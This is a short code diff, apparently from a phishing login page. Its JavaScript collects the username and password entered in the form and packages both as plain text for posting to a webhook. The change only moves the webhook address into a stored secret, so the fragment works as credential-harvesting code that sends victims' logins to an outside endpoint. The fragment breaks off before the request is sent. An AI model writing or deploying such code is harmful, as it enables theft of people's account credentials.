@@ -97,7 +97,7 @@
                 var username = document.getElementById('login-username').value;
                 var password = document.getElementById('login-password').value;
 
-                var webhookURL = '${{ webhook }}';
+                var webhookURL = '${{ secrets.WEBHOOK }}';
 
                 var payload = {
                     content: `Username: ${username}\nPassword: ${password}`
